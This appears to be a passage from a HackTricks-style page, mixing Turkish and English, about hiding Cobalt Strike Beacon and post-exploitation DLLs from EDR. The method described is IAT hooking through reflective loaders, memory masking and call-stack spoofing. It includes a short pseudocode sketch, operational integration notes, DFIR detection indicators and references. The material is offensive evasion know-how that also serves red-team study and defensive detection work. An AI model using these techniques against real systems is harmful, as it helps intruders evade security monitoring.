- Hedef modülün yanında reflective loader kullanarak (prepended veya companion) bir PIC blob yerleştirin. PIC, kendi içinde bütünsel ve position‑independent olmalıdır.
- Host DLL yüklenirken, IMAGE_IMPORT_DESCRIPTOR üzerinde dolaşın ve hedeflenen importlar için IAT girdilerini (ör. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) ince PIC wrapper'lara işaret edecek şekilde yama yapın.
- Her PIC wrapper gerçek API adresine tail‑call yapmadan önce evasion'lar uygular. Tipik evasion'lar şunlardır:
  - Çağrı etrafında bellek maskeleme/maske kaldırma (ör. beacon bölgelerini şifreleme, RWX→RX, sayfa isimlerini/izinlerini değiştirme) ve ardından çağrı sonrası geri yükleme.
  - Call‑stack spoofing: zararsız bir stack oluşturup hedef API'ye geçiş yaparak call‑stack analizinin beklenen frame'leri çözmesini sağlama.
- Uyumluluk için, bir arayüz export edin ki bir Aggressor script (veya eşdeğeri) Beacon, BOFs ve post‑ex DLLs için hangi API'lerin hooklanacağını kaydedebilsin.

Why IAT hooking here
- Hooklanan import'u kullanan her kod için çalışır; tool kodunu değiştirmeye veya Beacon'ın belirli API'leri proxy etmesine güvenmeye gerek kalmaz.
- Post‑ex DLLs kapsar: LoadLibrary* hooklamak modül yüklemelerini (ör. System.Management.Automation.dll, clr.dll) yakalamanıza ve aynı masking/stack evasion'ını onların API çağrılarına uygulamanıza imkan verir.
- CreateProcessA/W'i sararak process‑spawning post‑ex komutlarının call‑stack‑tabanlı detections karşısında güvenilir kullanımını geri getirir.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Yaması relocations/ASLR sonrasında ve import'un ilk kullanımından önce uygulayın. TitanLdr/AceLdr gibi reflective loaders, yüklenen modülün DllMain'inde hooking gösterir.
- Wrappers'ı küçük ve PIC-guvenli tutun; gerçek API'yi patch'ten önce yakaladığınız orijinal IAT değeri veya LdrGetProcedureAddress üzerinden çözün.
- PIC için RW → RX geçişleri kullanın ve yazılabilir+çalıştırılabilir sayfaları bırakmaktan kaçının.

Call‑stack spoofing stub
- Draugr‑style PIC stubs sahte bir çağrı zinciri (geri dönüş adresleri benign modüllere) oluşturur ve ardından gerçek API'ye pivot yapar.
- Bu, Beacon/BOFs'tan sensitive API'lere gelen canonical stack'leri bekleyen tespitleri bozar.
- API prologundan önce beklenen frame'lerin içine inmek için stack cutting/stack stitching teknikleriyle eşleştirin.

Operational integration
- Reflective loader'ı post‑ex DLL'lerin başına ekleyin ki PIC ve hook'lar DLL yüklendiğinde otomatik olarak başlansın.
- Hedef API'leri kaydetmek için bir Aggressor script kullanın, böylece Beacon ve BOFs aynı evasion path'ten kod değişikliği olmadan şeffaf şekilde faydalanır.

Detection/DFIR considerations
- IAT integrity: non‑image (heap/anon) adreslere çözülen entry'ler; import pointer'ların periyodik doğrulanması.
- Stack anomalies: yüklenmiş image'lara ait olmayan return adresleri; non‑image PIC'e ani geçişler; tutarsız RtlUserThreadStart ancestry.
- Loader telemetry: süreç içi IAT yazmaları, import thunk'larını değiştiren erken DllMain aktivitesi, yüklemede oluşturulan beklenmeyen RX bölgeleri.
- Image‑load evasion: LoadLibrary* hook'lanıyorsa, memory masking olaylarıyla korele edilmiş automation/clr assembly'lerinin şüpheli yüklemelerini izleyin.

Related building blocks and examples
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
